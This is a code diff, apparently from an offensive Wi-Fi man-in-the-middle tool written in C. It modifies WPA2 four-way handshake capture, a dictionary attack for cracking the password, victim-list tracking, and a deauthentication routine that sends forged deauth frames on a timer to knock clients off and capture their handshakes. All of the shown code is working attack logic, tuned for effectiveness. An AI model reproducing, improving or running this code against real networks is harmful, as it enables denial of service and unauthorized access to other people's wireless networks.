@@ -103,7 +103,9 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 				log_printf(MSG_DEBUG, "Dictionary attack failed\n");
 				return -1;
 			}
-		}
+		} else {
+      info->enough = 0;
+    }
 	}
 	return 0;
 }
@@ -224,8 +226,8 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 		
 		case IEEE80211_QOS_DATA :{
 			/* we case the packet context util crash password. */
-			if (MITM->state < 2)
-				break;
+//			if (MITM->state < 2)
+//				break;
 			packet = malloc(sizeof(struct WPA2_handshake_packet));
 			struct WPA2_handshake_packet *tmp = (struct WPA2_handshake_packet *)packet;
 			tmp->type = type;
@@ -240,11 +242,11 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
           fill_encry_info(MITM, packet);
         }
         break;
-      case MITM_state_ready :;
+      case MITM_state_ap_search :;
         /* Alies */
         struct ieee80211_qos_hdr* hdr = (struct ieee80211_qos_hdr*)tmp->ieee80211_data;
-        if (!memcmp(hdr->addr1, MITM->encry_info.AA, ETH_ALEN)) {
-            maintain_victim_list(&MITM->victim_list, hdr->addr2);
+        if (MITM->encry_info.AA && !memcmp(hdr->addr1, MITM->encry_info.AA, ETH_ALEN)) {
+          maintain_victim_list(&MITM->victim_list, hdr->addr2);
         }
         break;
       }
@@ -310,7 +312,7 @@ void deauth_attack(void *eloop_data, void *user_ctx) {
 	if (!packet)
 		return;
 	/* XXX : I am not really sure how to define the seqence num of packet */
-	ret = construct_deauth_pkt(packet, &pkt_len, NULL, MITM->encry_info.AA, 9500);
+	ret = construct_deauth_pkt(packet, &pkt_len, MITM->encry_info.SA, MITM->encry_info.AA, 9500);
 	if (ret < 0) {
 		log_printf(MSG_WARNING, "[Deauth]Prepare deauthentication packet failed.");
 	}
@@ -318,8 +320,8 @@ void deauth_attack(void *eloop_data, void *user_ctx) {
 	if (ret < 0) {
 		log_printf(MSG_WARNING, "[Deauth]Send deauth packet failed, with error:%s", strerror(errno));
 	}
-	if (!MITM->encry_info.enough) 
-		eloop_register_timeout(1, 0, deauth_attack, NULL, MITM);
+	if (MITM->state == MITM_state_capture_handshake) 
+		eloop_register_timeout(3, 0, deauth_attack, NULL, MITM);
 	free(packet);
 }
 
